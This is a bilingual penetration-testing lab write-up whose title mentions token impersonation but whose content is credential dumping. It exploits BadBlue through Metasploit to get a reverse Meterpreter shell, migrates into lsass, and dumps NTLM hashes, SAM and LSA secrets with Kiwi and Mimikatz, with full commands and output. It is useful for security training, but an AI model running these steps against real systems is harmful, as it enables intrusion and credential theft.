---
layout: post
title: "Windows Privilege Escalation Token Impersonation With Incognito"
date: "2023-02-18"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Dumping Hashes With Mimikatz
## Mimikatz
Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentikiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases, and more.

The SAM (Security Account Manager) database is a database file on Windows systems that stores users' passwords and can be used to authenticate users both locally and remotely.

We can utilize the pre-built mimikatz executable. Alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk.

# 使用 Mimikatz 转储哈希
## Mimikatz
Mimikatz 是由 Benjamin Delpy (@gentikiwi) 编写的 Windows 后期利用工具。 它允许从内存中提取明文凭据、从本地 SAM 数据库中提取密码哈希等。

SAM（安全账户管理器）数据库是 Windows 系统上存储用户密码的数据库文件，可用于在本地和远程对用户进行身份验证。

我们可以利用预构建的 mimikatz 可执行文件。 或者，如果我们可以访问 Windows 目标上的 meterpreter 会话，我们可以使用内置的 meterpreter 扩展 Kiwi。

Kiwi 允许我们在不接触磁盘的情况下在目标系统上动态执行 Mimikatz。

# Demo: Dumping Hashes With Mimikatz（演示：使用 Mimikatz 转储哈希）
We can utilize the pre-built mimikatz executable, that we can transfer over to the target and then execute manually.

Kiwi is just a meterpreter extension that allows us to, execute mimikatz from within memory as opposed to utilizing the actual mimikaz executable.

And you don't have to go through the process of transferring over the mimikatz executable. And that also comes with its own risk, and the risks associated with transferring exploit code or executables onto the target system are that you need to take into consideration things like antivirus detection. The actual exploit files may be found. So, it's always good to do things dynamically and in memory.

Target IP Address: 10.2.16.222

[BadBlue 2.72b PassThru Buffer Overflow](https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru/)

This module exploits a stack buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier.

BadBlue 2.72b PassThru 缓冲区溢出

该模块利用了 BadBlue 2.72b 及更早版本中 ext.dll 中 PassThru 功能中的堆栈缓冲区溢出。

```
service postgresql start && msfconsole
workspace -a Mimikatz
setg RHOSTS 10.2.16.222
db_nmap -sV 10.2.16.222
search badblue 2.7
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

Perform some local system enumeration.

```
meterpreter > sysinfo
Meterpreter : x86/windows
```

List out the processes that we can migrate to.

```
meterpreter > ps
```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

We have access via the administrator account, which means that our privileges are elevated. And in order to dump hashes or credentials, you need elevated privileges. That's why we covered the privilege escalation process beforehand.

So we can migrate to the LSASS process. So if I want to search for a specific process, I can utilize the `pgrep` option.

```
meterpreter > pgrep lsass
792
```

That's under the process id 792.

And because we have elevated privileges, we should be able to migrate without any issuses.

```
meterpreter > migrate 792
```

```
meterpreter > sysinfo
Meterpreter : x64/windows
```

Our Meterpreter payload is currently now a 64-bit payload. We have a 64-bit session.

So now that we've done that, we can load kiwi, which is just mimikatz but a module that was made for Meterpreter.

It's going to load the kiwi extension.

```
meterpreter > load kiwi
```

[MIMIKATZ](https://www.offensive-security.com/metasploit-unleashed/mimikatz/)

Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.

Mimikatz 支持 32 位和 64 位 Windows 架构。将权限升级到 SYSTEM 后，我们需要使用sysinfo命令验证受感染机器的架构。这将与 64 位机器相关，因为我们可能已经在 64 位架构上破坏了 32 位进程。如果是这种情况，meterpreter 将尝试将 32 位版本的 Mimikatz 加载到内存中，这将导致大多数功能无法正常运行。这可以通过查看正在运行的进程列表并在加载 Mimikatz 之前迁移到 64 位进程来避免。

Once you've loaded the kiwi extension it'll give you a list of commands that you can run based on the type of credentials that you want to dump. 

```
meterpreter > help

Kiwi Commands
==============

Command             Description
-------             -----------
creds_all           Retrieve all credentials (parsed)
lsa_dump_sam        Dump LSA SAM (unparsed)
lsa_dump_secrets    Dump LSA secrets (unparsed)
```

```
Kiwi命令
==============

命令                说明
------              ----------
creds_all           检索所有凭据（已解析）
lsa_dump_sam        转储 LSA SAM（未解析）
lsa_dump_secrets    转储 LSA 机密（未解析）
```

We can first and foremost run the `creds_all` (credentials all command) to retrieve all credentials. 

We can also dump the contents of the SAM database using `lsa_dump_sam`. 

We can also dump the LSA secrets using `lsa_dump_secrets`.

So let's try and dump all the credentials first.

```
meterpreter > creds_all
```

So we can also dump the contents of the SAM database by saying `lsa_dump_sam`.

```
meterpreter > lsa_dump_sam
```

We can also take a look at how to dump the LSA secrets by saying `lsa_dump_secrets`.

```
meterpreter > lsa_dump_secrets
```

And in this case, we only get the SysKey (system key) for the domain.

In the next video, we will be exploring the process of utilizing these hashes to perform a pass-the-hash attack and consequently authenticate to the target system legitimately using the hash.

The NTLM hash does not necessarily need to be cracked in order to get the clear-text password. In the next video, we'll be exploring the process of how to utilize these hashes for legitimate authentication.

That's pretty much it in regards to dumping hashes with Mimikatz. You have the ability of also transferring the Mimikatz binary onto the target system manually.

```
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Open up a command prompt session, I can then execute it by saying `.\mimikatz.exe`.

```
meterpreter > shell
C:\Windows\system32>.\mimikatz.exe
```

Mimikatz loads directly from within the command shell.

We can type in the `privilege::debug` command to ensure that we have the appropriate privileges.

```
mimikatz # privilege::debug
Privilege '20' OK
```

And if it tells us "Privilege '20' OK", then it means that we have the required privileges in order to dump our passwords.

So in terms of the native Mimikatz commands and not Meterpreter commands, we can dump the logon passwords by typing in `sekurlsa::logonpasswords`.

```
mimikatz # sekurlsa::logonpasswords
```

That'll dump the logon passwords. In this case, we weren't able to get the clear-text password.

And it looks like we weren't able to identify the student user account. And this is going to require that the student user account has been logged into. And in this case, it doesn't look like it has, so we aren't able to get any of the logon passwords.

We can also dump the SAM database by saying `lsadump::sam`.

```
mimikatz # lsadump::sam
```

That will dump the contents of the SAM database.

I would recommand utilizing the kiwi module.

That is how to utilize Mimikatz to dump NTLM hashes as well as clear-text passwords.

But in this case, we weren't able to find any clear-text passwords. And that's by design because I'm going to show you how to utilize NTLM hashes for authentication.

# Windows: Meterpreter: Kiwi Extension
## Overview
A Kali GUI machine and a target machine running vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the machine using the appropriate Metasploit module. Then, use the meterpreter Kiwi plugin to extract sensitive data from the target's machine.

Objective: Exploit the application and find all the flags.
* Find Administrator and Student users NTLM hash.
* Dump LSA secrets to find Syskey

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. 
* The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

为您提供了 Kali GUI 机器和运行易受攻击应用程序的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，然后使用适当的 Metasploit 模块利用该机器。然后，使用 meterpreter Kiwi 插件从目标机器中提取敏感数据。

目标：利用应用程序并找到所有标志。
* 查找管理员和学生用户 NTLM 哈希。
* 转储 LSA 机密以查找 Syskey

说明：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口 运行“ip addr”来知道 X 和 Y 的值。 
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于IP地址192.VW1和10.10.X.1的网关

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2340.pdf

## 复现视频中的内容
Target IP Address : 10.0.21.9

```
root@attackdefense:~# service postgresql start && msfconsole
msf6 > workspace -a Mimikatz
[*] Added workspace: Mimikatz
[*] Workspace: Mimikatz
msf6 > setg RHOSTS 10.0.21.9
RHOSTS => 10.0.21.9
msf6 > db_nmap -sV 10.0.21.9
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-18 15:02 IST
[*] Nmap: Nmap scan report for 10.0.21.9
[*] Nmap: Host is up (0.0026s latency).
[*] Nmap: Not shown: 994 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 80/tcp   open  http          BadBlue httpd 2.7
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
msf6 > services
Services
========

host       port  proto  name           state  info
----       ----  -----  ----           -----  ----
10.0.21.9  80    tcp    http           open   BadBlue httpd 2.7
10.0.21.9  135   tcp    msrpc          open   Microsoft Windows RPC
10.0.21.9  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.0.21.9  445   tcp    microsoft-ds   open   
10.0.21.9  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
10.0.21.9  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
```

```
msf6 > search badblue 2.7

Matching Modules
================

   #  Name                                   Disclosure Date  Rank   Check  Description
   -  ----                                   ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_passthru  2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/badblue_passthru

msf6 > use exploit/windows/http/badblue_passthru
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.0.21.9        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.21.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target BadBlue\ 2.72b\ Universal    
set target 1                            set target BadBlue\ EE\ 2.7\ Universal  
msf6 exploit(windows/http/badblue_passthru) > set target BadBlue\ EE\ 2.7\ Universal 
target => BadBlue EE 2.7 Universal

```

```
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.21.3:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.21.9
[*] Meterpreter session 1 opened (10.10.21.3:4444 -> 10.0.21.9:50220) at 2023-02-18 15:09:43 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
 0     0     [System Process]                                                      
 4     0     System                   x64   0                                      
 88    4     Registry                 x64   0                                      
 392   4     smss.exe                 x64   0                                      
 432   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 496   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552   544   csrss.exe                x64   0                                      
 572   5848  fontdrvhost.exe          x64   3        Font Driver Host\UMFD-3       C:\Windows\System32\fontdrvhost.exe
 628   544   wininit.exe              x64   0                                      
 636   620   csrss.exe                x64   1                                      
 692   620   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 712   6960  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 768   628   services.exe             x64   0                                      
 780   628   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 860   692   dwm.exe                  x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 876   904   TiWorker.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1450_none_56e6965b991df4af\TiWorker.exe
 884   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 904   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 932   628   fontdrvhost.exe          x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 940   692   fontdrvhost.exe          x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 1016  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1028  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1084  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1088  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1124  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1148  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1164  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1332  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1352  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1372  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1428  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1440  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1456  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1468  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1492  768   TrustedInstaller.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1548  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1556  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1604  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1640  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1660  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1688  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1720  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1764  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1844  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1872  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2032  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2080  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2112  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2200  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2208  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2312  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2372  768   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2392  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2480  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2500  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2516  768   LiteAgent.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2536  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2604  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2616  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2640  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2656  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2668  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2716  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2856  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3188  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3340  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3572  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3760  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 3820  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3864  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3876  2112  sihost.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\sihost.exe
 3896  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3916  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3956  1548  taskhostw.exe            x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\taskhostw.exe
 4016  3728  explorer.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\explorer.exe
 4148  5604  csrss.exe                x64   3                                      
 4292  904   ShellExperienceHost.exe  x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4300  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 4400  904   SearchUI.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 4476  904   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4584  904   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4644  4328  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 4780  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4940  904   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4996  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5112  4016  badblue.exe              x86   1        ATTACKDEFENSE\Administrator   C:\Program Files (x86)\BadBlue\EE\badblue.exe
 5180  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5408  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5416  768   msdtc.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 5524  4644  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5608  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 5848  5604  winlogon.exe             x64   3        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 5976  5848  LogonUI.exe              x64   3        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 6088  5848  dwm.exe                  x64   3        Window Manager\DWM-3          C:\Windows\System32\dwm.exe
 6188  1028  rdpclip.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\rdpclip.exe
 6492  3340  ctfmon.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\ctfmon.exe
 6584  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 6620  768   vds.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 6796  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 6940  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 6956  1548  taskhostw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\taskhostw.exe
 6960  1548  CompatTelRunner.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
 7008  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 7084  768   amazon-ssm-agent.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > pgrep lsass
780
meterpreter > migrate 780
[*] Migrating from 5112 to 780...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

```
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

```

```
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

```

```
meterpreter > help kiwi

Kiwi命令
=============

     命令说明
     ------ ----------
     creds_all 检索所有凭据（已解析）
     creds_kerberos 检索 Kerberos 凭证（已解析）
     creds_livessp 检索实时 SSP 凭据
     creds_msv 检索 LM/NTLM 凭据（已解析）
     creds_ssp 检索 SSP 凭据
     creds_tspkg 检索 TsPkg 凭据（已解析）
     creds_wdigest 检索 WDigest 凭据（已解析）
     dcsync 通过 DCSync 检索用户帐户信息（未解析）
     dcsync_ntlm 通过 DCSync 检索用户帐户 NTLM 哈希、SID 和 RID
     golden_ticket_create 创建一个黄金 kerberos 票证
     kerberos_ticket_list 列出所有 kerberos 票证（未解析）
     kerberos_ticket_purge 清除任何正在使用的 kerberos 票证
     kerberos_ticket_use 使用 kerberos 票证
     kiwi_cmd 执行任意 mimikatz 命令（未解析）
     lsa_dump_sam 转储 LSA SAM（未解析）
     lsa_dump_secrets 转储 LSA 机密（未解析）
     password_change 更改用户的密码/哈希
     wifi_list 列出当前用户的 wifi 配置文件/凭据
     wifi_list_shared 列出共享的 wifi 配置文件/凭据（需要 SYSTEM）
```

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)

```

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

```

```
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 

```

```
meterpreter > pwd
C:\Windows\system32
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
